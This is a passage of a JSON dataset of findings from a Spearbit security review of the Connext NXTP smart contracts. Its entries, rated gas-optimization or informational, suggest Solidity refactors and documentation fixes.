        "title": "branchRoot function in Merkle.sol can be more optimized by using YUL, unrolling the loop and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "We can use assembly, unroll the loop in branchRoot, and use the scratch space to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Replace divisions by powers of 2 by right shifts and multiplications by left shifts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When a variable X is divided (multiplied) by a power of 2 (C = 2  c) which is a constant value, the division (multiplication) operation can be replaced by a right (left) shift to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TypedMemView.castTo can be optimized by using bitmasks instead of multiple shifts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView.castTo uses bit shifts to clear the type flag bits of a memView, instead masking can be used. Also an extra OR is used to calculate the final view.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Make domain immutable in Facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Domain in Connector.sol is an immutable variable, however it is defined as a storage variable in LibConnextStorage.sol. Also once initialized in DiamondInit.sol, it cannot be updated again. To save gas, domain can be made an immutable variable to avoid reading from storage.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache router balance in repayAavePortal()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "repayAavePortal() reads s.routerBalances[msg.sender][local] twice: if (s.routerBalances[msg.sender][local] < _maxIn) revert PortalFacet__repayAavePortal_insufficientFunds(); ,! ... s.routerBalances[msg.sender][local] -= amountDebited; This can be cached to only read it once.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unrequired if condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The below if condition is not required as price will always be 0. This is because if contract finds direct price for asset it returns early, otherwise if no direct price then tokenPrice is set to 0. This means for the code ahead tokenPrice will currently be 0. function getTokenPrice(address _tokenAddress) public view override returns (uint256, uint256) { ... uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } if (tokenPrice == 0) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Delete slippage for gas refund",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once s.slippage[_transferId] is read, it's never read again. It can be deleted to get some gas refund.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Emit event at the beginning in _setOwner()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_setOwner() maintains an extra variable oldOwner just to emit an event later: function _setOwner(address newOwner) internal { address oldOwner = _owner; _owner = newOwner; _proposedOwnershipTimestamp = 0; _proposed = address(0); emit OwnershipTransferred(oldOwner, newOwner); } If this emit is done at the beginning, oldOwner can be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify the assignment logic of _params.normalizedIn in _xcall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When amount > 0 we should have asset != address(0) since otherwise the call would revert: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } and when amount == 0 _params.normalizedIn is 0 which is the value passed to _xcall from xcall or xcall- IntoLocal. So we can move the calculation for _params.normalizedIn into the if (_amount > 0) { block. 90 if (_amount > 0) { // Transfer funds of input asset to the contract from the user. AssetLogic.handleIncomingAsset(_asset, _amount); // Swap to the local asset from adopted if applicable. // TODO: drop the \"IfNeeded\", instead just check whether the asset is already local / needs swap here. _params.bridgedAmt = AssetLogic.swapToLocalAssetIfNeeded(key, _asset, local, _amount, ,! _params.slippage); // Get the normalized amount in (amount sent in by user in 18 decimals). _params.normalizedIn = AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); } gas saved according to test cases: test_Connext__bridgeFastOriginLocalToDestinationAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__bridgeFastAdoptedShouldWork() (gas: -39 (-0.001%)) test_Connext__unpermissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_worksWithPositiveSlippage() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_adoptedTransferWorks() (gas: -39 (-0.003%)) test_Connext__permissionedCallsWork() (gas: -39 (-0.003%)) test_BridgeFacet__xcallIntoLocal_works() (gas: -39 (-0.003%)) test_BridgeFacet__xcall_localTokenTransferWorksWithAdopted() (gas: -39 (-0.003%)) test_Connext__bridgeFastLocalShouldWork() (gas: -39 (-0.004%)) test_BridgeFacet__xcall_localTokenTransferWorksWhenNotAdopted() (gas: -39 (-0.004%)) test_Connext__bridgeSlowLocalShouldWork() (gas: -39 (-0.005%)) test_Connext__zeroValueTransferWithEmptyAssetShouldWork() (gas: -54 (-0.006%)) test_BridgeFacet__xcall_worksIfPreexistingRelayerFee() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_localTokenTransferWorksWithoutAdopted() (gas: -39 (-0.013%)) test_BridgeFacet__xcall_zeroRelayerFeeWorks() (gas: -32 (-0.014%)) test_BridgeFacet__xcall_canonicalTokenTransferWorks() (gas: -39 (-0.014%)) test_LibDiamond__initializeDiamondCut_withZeroAcceptanceDelay_works() (gas: -3812 (-0.015%)) test_BridgeFacet__xcall_zeroValueEmptyAssetWorks() (gas: -54 (-0.034%)) test_BridgeFacet__xcall_worksWithoutValue() (gas: -795 (-0.074%)) test_Connext__zeroValueTransferShouldWork() (gas: -761 (-0.091%)) Overall gas change: -6054 (-0.308%) Note, we need to make sure in future updates the value of _params.normalizedIn == 0 for any invocation of _xcall. Connext: Solved in PR 2511. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify BridgeFacet._sendMessage by defining _token only when needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In BridgeFacet._sendMessage, _local might be a canonical token that does not necessarily have to follow the IBridgeToken interface. But that is not an issue since _token is only used when !_isCanonical.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using BridgeMessage library in BridgeFacet._sendMessage can be avoid to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The usage of BridgeMessage library to calculate _tokenId, _action, and finally the formatted mes- sage involves lots of unnecessary memory writes, redundant checks, and overall complicates understanding the flow of the codebase. The BridgeMessage.formatMessage(_tokenId, _action) value passed to IOutbox(s.xAppConnectionManager.home()).dispatch is at the end with the current implementation supposed to be: 92 abi.encodePacked( _canonical.domain, _canonical.id, BridgeMessage.Types.Transfer, _amount, _transferId ); Also, it is redundant that the BridgeMessage.Types.Transfer has been passed to dispatch. it does not add any information to the message unless dispatch also accepts other types. This also adds extra gas overhead due to memory consumption both in the origin and destination domains.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "s.aavePool can be cached to save gas in _backLoan",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "s.aavePool can be cached to save gas by only reading once from the storage.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "<= or >= when comparing a constant can be converted to < or > to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In this context, we are doing the following comparison: X <= C // or X >= C Where X is a variable and C is a constant expression. But since the right-hand side of <= (or >=) is the constant expression C we can convert <= into < (or >= into >) to avoid extra opcode/bytecodes being produced by the compiler.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use memory's scratch space to calculateCanonicalHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "calculateCanonicalHash uses abi.encode to prepare a memory chuck to calculate and return a hash value. Since only 2 words of memory are required to calculate the hash we can utilize the memory's scratch space [0x00, 0x40) for this regard. Using this approach would prevent from paying for memory expansion costs among other things.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isLocalOrigin can be optimized by using a named return parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "isLocalOrigin after getting the code size of _token returns a comparison result as a bool: assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; This last comparison can be avoided if we use a named return variable since the cast to bool type would automat- ically does the check for us. Currently, the check/comparison is performed twice under the hood. Note: also see issue \"Use contract.code.length\".",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The branching decision in AmplificationUtils._getAPrecise can be removed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_getAPrecise uses if/else block to compare a1 to a0. This comparison is unnecessary if we use a more simplified formula to return the interpolated value of a.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize increment in insert()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The increment tree.count in function insert() can be optimized. function insert(Tree storage tree, bytes32 node) internal returns (uint256) { uint256 size = tree.count + 1; ... tree.count = size; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize calculation in loop of dequeueVerified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function dequeueVerified() can be optimized in the following way: (block.number - com- mitBlock >= delay) is the same as (block.number - delay >= commitBlock ) And block.number - delay is constant so it can be calculated outside of the loop. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { uint256 commitBlock = queue.commitBlock[last]; if (block.number - commitBlock >= delay) { ... } } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Fetching array length for each iteration generally consumes more gas compared to caching it in a variable.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization Diamond.sol#L35, Multicall.sol#L16, StableSwap.sol#L90, LibDi-"
        ]
    },
    {
        "title": "Use custom errors instead of encoding the error message",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView.sol replicates the functionality provided by custom error with arguments: (, uint256 g) = encodeHex(uint256(typeOf(memView))); (, uint256 e) = encodeHex(uint256(_expected)); string memory err = string( abi.encodePacked(\"Type assertion failed. Got 0x\", uint80(g), \". Expected 0x\", uint80(e)) ); revert(err); encodeHex() is only used to encode a variable for an error message.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid OR with a zero variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Boolean OR operation with a zero variable is a no-op. Highlighted code above perform a boolean OR operation with a zero variable which can be avoided: newView := or(newView, shr(40, shl(40, memView))) ... newView := shl(96, or(newView, _type)) // insert type ... _encoded |= _nibbleHex(_byte >> 4); // top 4 bits",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use scratch space instead of free memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Memory slots 0x00 and 0x20 are scratch space. So any operation in assembly that needs at most 64 bytes of memory to write temporary data can use scratch space. Functions sha2(), hash160() and hash256() use free memory to write the intermediate hash values. The scratch space can be used here since these values fit in 32 bytes. It saves gas spent on reading the free memory pointer, and memory expansion.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant checks in _processMessageFromRoot() of PolygonSpokeConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _processMessageFromRoot() of PolygonSpokeConnector does two checks on sender, which are the same: PolygonSpokeConnector.sol#L78-L82,  validateSender(sender) checks sender == fxRootTunnel  _setMirrorConnector() and setFxRootTunnel() set fxRootTunnel = _mirrorConnector and mirrorCon- nector = _mirrorConnector  require(sender == mirrorConnector, ...) checks sender == mirrorConnector which is the same as sender == fxRootTunnel. Note: the require in _setMirrorConnector() makes sure the values can't be updated later on. So one of the checks in function _processMessageFromRoot() could be removed to save some gas and to make the code easier 104 to understand. contract PolygonSpokeConnector is SpokeConnector, FxBaseChildTunnel { function _processMessageFromRoot(..., ... require(sender == mirrorConnector, \"!sender\"); ... address sender, ... ) validateSender(sender) { } function _setMirrorConnector(address _mirrorConnector) internal override { require(fxRootTunnel == address(0x0), ...); setFxRootTunnel(_mirrorConnector); } } abstract contract FxBaseChildTunnel is IFxMessageProcessor { function setFxRootTunnel(address _fxRootTunnel) public virtual { ... fxRootTunnel = _fxRootTunnel; // == _mirrorConnector } modifier validateSender(address sender) { require(sender == fxRootTunnel, ...); _; } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization PolygonSpokeConnector.sol#L61-L74,"
        ]
    },
    {
        "title": "Consider using bitmaps in _recordOutputAsSpent() of ArbitrumHubConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _recordOutputAsSpent() stores status via a mapping of booleans. However the equiv- alent function recordOutputAsSpent() of Arbritrum Nitro uses a mapping of bitmaps to store the status. Doing this saves gas. Note: this saving is possible because the index values are neatly ordered. function _recordOutputAsSpent(..., uint256 _index, ...) ... { ... require(!processed[_index], \"spent\"); ... processed[_index] = true; } Arbitrum version: function recordOutputAsSpent(..., uint256 index, ... ) ... { ... (uint256 spentIndex, uint256 bitOffset, bytes32 replay) = _calcSpentIndexOffset(index); if (_isSpent(bitOffset, replay)) revert AlreadySpent(index); spent[spentIndex] = (replay | bytes32(1 << bitOffset)); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Move nonReentrant from process() to proveAndProcess()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function process() has a nonReentrant modifier. The function process() is also internal and is only called from proveAndProcess(), so it also possible to move the nonReentrant modifier to function proveAndProcess(). This would save repeatedly setting and unsetting the status of nonReentrant, which saves gas. function proveAndProcess(...) ... { ... for (uint32 i = 0; i < _proofs.length; ) { process(_proofs[i].message); unchecked { ++i; } } } function process(bytes memory _message) internal nonReentrant returns (bool _success) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "OpenZeppelin libraries IERC20Permit and EIP712 are final",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The OpenZeppelin libraries have changed IERC20Permit and EIP712 to a final version, so the final versions can be used. OZERC20.sol import \"@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol\"; import {EIP712} from \"@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol\"; draft-IERC20Permit.sol // EIP-2612 is Final as of 2022-11-01. This file is deprecated. import \"./IERC20Permit.sol\"; draft-EIP712.sol // EIP-712 is Final as of 2022-08-11. This file is deprecated. import \"./EIP712.sol\";",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Foundry's multi-chain tests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Foundry supports multi-chain testing that can be useful to catch bugs earlier in the development process. Local multi-chain environment can be used to test many scenarios not possible on test chains or in production. Since Connectors are a critical part of NXTP protocol.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Risk of chain split",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Domains are considered immutable (unless implementation contracts are redeployed). In case of chain splits, both the forks will continue having the same domain and the recipients won't be able to differentiate which source chain of the message.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use zkSync's custom compiler for compiling and (integration) testing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The protocol needs to be deployed on zkSync. For deployment, the contracts would need to be compiled with zkSync's custom compiler. The bytecode generated by the custom Solidity compiler is quite dif- ferent compared to the original compiler. One thing to note is that cryptographic functions in Solidity are being replaced/inlined to static calls to zkSync's set of system precompile contracts.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared logic in SwapUtilsExternal and SwapUtils can be consolidated or their changes would need to be synched.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The SwapUtilsExternal library and SwapUtils share quite a lot of functions (events/...) logics . The main differences are:  SwapUtilsExternal.swap does not have the following check but SwapUtils.swap does: // File: connext/libraries/SwapUtils.sol#L715 require(dx == tokenFrom.balanceOf(address(this)) - beforeBalance, \"no fee token support\"); This is actually one of the big/important diffs between current SwapUtils and SwapUtilsExternal. Other differ- ences are:  Some functions are internal in SwapUtils, but they are external/public in SwapUtilsExternal.  AmplificationUtils is basically copied in SwapUtilsExternal and its functions have been made external.  SwapUtilsExternal does not implement exists.  SwapUtilsExternal does not implement swapInternal.  The SwapUtils's Swap struct has an extra field key as do the events in this file.  Some inconsistent formatting. 109",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document why < 3s was chosen as the timestamp deviation cap for price reporting in setDirect- Price",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setDirectPrice uses the following require statement to filter direct price reports by the owner. require(_timestamp - block.timestamp < 3, \"in future\"); Only prices with _timestamp within 3s of the current block timestamp are allowed to be registered.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what IConnectorManager entities would be passed to BridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Document what type of IConnectorManager implementations would the owner or an admin set for the s.xAppConnectionManager. The only examples in the codebase are SpokeConnectors.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Second nonReentrant modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A previous version of xcall() had a nonReentrant modifier. This modifier was removed to enable execute() to call xcall() to return data to the originator chain. To keep a large part of the original protec- tion it is also possible to use a separate nonReentrant modifier (which uses a different storage variable) for xcall()/xcallIntoLocal(). This way both execute and xcall()/xcallIntoLocal() can be called once at the most. function xcall(...) ... { } function xcallIntoLocal(...) ... { } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Return 0 in swapToLocalAssetIfNeeded()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The return in function swapToLocalAssetIfNeeded() could also return 0. Which is somewhat more readable and could save some gas. Note: after studying the compiler output it might not actually save gas. 111 function swapToLocalAssetIfNeeded(...) ... { if (_amount == 0) { return _amount; } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use contract.code.length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Retrieving the size of a contract is done in assembly, with extcodesize(). This can also be done in solidity which is more readable. Note: assembly might be a bit more gas efficient, especially if optimized even further: see issue \"isLocalOrigin can be optimized by using a named return parameter\". LibDiamond.sol function enforceHasContractCode(address _contract, string memory _errorMessage) internal view { uint256 contractSize; assembly { contractSize := extcodesize(_contract) } require(contractSize != 0, _errorMessage); } AssetLogic.sol function isLocalOrigin(address _token, AppStorage storage s) internal view returns (bool) { ... uint256 _codeSize; // solhint-disable-next-line no-inline-assembly assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "cap and liquidity tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function addLiquidity() also adds tokens to the Connext Diamond contract. If these tokens are the same as canonical tokens it wouldn't play nicely with the cap on these tokens. For others tokens it might also be relevant to have a cap. function addLiquidity(...) ... { ... token.safeTransferFrom(msg.sender, address(this), amounts[i]); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify _swapAssetOut()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _swapAssetOut() has relative complex logic where it first checks the tokens that will be received and then preforms a swap. It prevents reverting by setting the success flag. However function repayAave- Portal() still reverts if this flag is set. The comments show this was meant for reconcile(), however repaying the Aave dept in the reconcile phase no longer exists. So _swapAssetOut() could just revert if insufficiently tokens are provided. This way it would also be more similar to _swapAsset(). This will make the code more readable and safe some gas. AssetLogic.sol 113 function _swapAssetOut(...) ... returns ( bool success, ...) { ... if (ipool.exists()) { ... // Calculate slippage before performing swap. // NOTE: This is less efficient then relying on the `swapInternalOut` revert, but makes it ,! easier // to handle slippage failures (this can be called during reconcile, so must not fail). ... if (_maxIn >= ipool.calculateSwapInv(tokenIndexIn, tokenIndexOut, _amountOut)) { success = true; amountIn = ipool.swapInternalOut(tokenIndexIn, tokenIndexOut, _amountOut, _maxIn); } } else { ... uint256 _amountIn = pool.calculateSwapOutFromAddress(_assetIn, _assetOut, _amountOut); if (_amountIn <= _maxIn) { success = true; ... amountIn = pool.swapExactOut(_amountOut, _assetIn, _assetOut, _maxIn, block.timestamp + ,! 3600); } } } function swapFromLocalAssetIfNeededForExactOut(...) { ... return _swapAssetOut(_key, _asset, adopted, _amount, _maxIn); } PortalFacet.sol function repayAavePortal(...) { ... (bool success, ..., ...) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(...); if (!success) revert PortalFacet__repayAavePortal_swapFailed(); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Return default false in the function end",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "verify function is missing a default return value. A return value of false can be added on the function end",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change occurances of whitelist to allowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the codebase, whitelist is used to represent entities or objects that are allowed to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment on _mirrorConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment on _mirrorConnector is incorrect as this does not denote address of the spoke connector",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "addStableSwapPool can have a more suggestive name and also better documentation for the _- stableSwapPool input parameter is recommended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. The name suggests we are adding a new pool, although we are replacing/updating the current one. 2. _stableSwapPool needs to implement IStableSwap and it is supposed to be an external stable swap pool. It would be best to indicate that and possibly change the parameter input type to IStableSwap _stableSwap- Pool. 3. _stableSwapPool provided by the owner or an admin can have more than just 2 tokens as the @notice comment suggests. For example, the pool could have oUSDC, nextUSDC, oDAI, nextDAI, ... . Also there are no guarantees that the pooled tokens are pegged to each other. There is also a potential of having these pools have malicious or worthless tokens. What external pools does Connext team uses or is planning to use? This comment also applies to setupAsset and setupAssetWithDeployedRepresentation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "_local has a misleading name in _addLiquidityForRouter and _removeLiquidityForRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The name for _local parameter is misleading, since it has been used in _addLiquidityForRouter (TokenId memory canonical, bytes32 key) = _getApprovedCanonicalId(_local); and in _removeLiquidityForRouter TokenId memory canonical = _getCanonicalTokenId(_local); and we have the following call flow path: AssetLogic.getCanonicalTokenId uses the adoptedToCanonical mapping first then check if the input parameter is a canonical token for the current domain, then uses representationToCanonical mapping. So here _local could be an adopted token.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document _calculateSwap's and _calculateSwapInv's calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In _calculateSwap, the -1 in dy = xp[tokenIndexTo] - y - 1 is actually important. This is be- cause given no change in the asset balance of all tokens that already satisfy the stable swap invariant (dx = 0), getY (due to rounding errors) might return:  y = xp[tokenIndexTo] which would in turn make dy = -1 that would revert the call. This case would need to be investigated.  y = xp[tokenIndexTo] - 1 which would in turn make dy = 0 and so the call would return (0, 0).  y = xp[tokenIndexTo] + 1 which would in turn make dy = -2 that would revert the call. This case would need to be investigated. 117 And similiarly in _calculateSwapInv, doing the same analysis for + 1 in dx = x - xp[tokenIndexFrom] + 1, if getYD returns:  xp[tokenIndexFrom] +1, then dx = 2;  xp[tokenIndexFrom], then dx = 1;  xp[tokenIndexFrom] - 1, then dx = 0; Note, that the behavior is different and the call would never revert.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Providing the from amount the same as the pool's from token balance, one might get a different return value compared to the current pool's to balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Note, due to some imbalance in the asset pool, given x = xp[tokenIndexFrom] (aka, no change in asset balance of tokenIndexFrom token in the asset pool), we might see a decrease or increase in the asset balance of tokenIndexTo to bring back the pool to satisfying the stable swap invariant. One source that can introduce an imbalance is when the scaled amplification coefficient is ramping.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what type 0 means for TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the following line, 0 is passed as the new type for a TypedMemView bytes29 _message.slice(PREFIX_LENGTH, _message.len() - PREFIX_LENGTH, 0) But there is no documentation as to what type 0 signifies.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixed use of require statements and custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The codebase includes a mix of require statements and custom errors.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
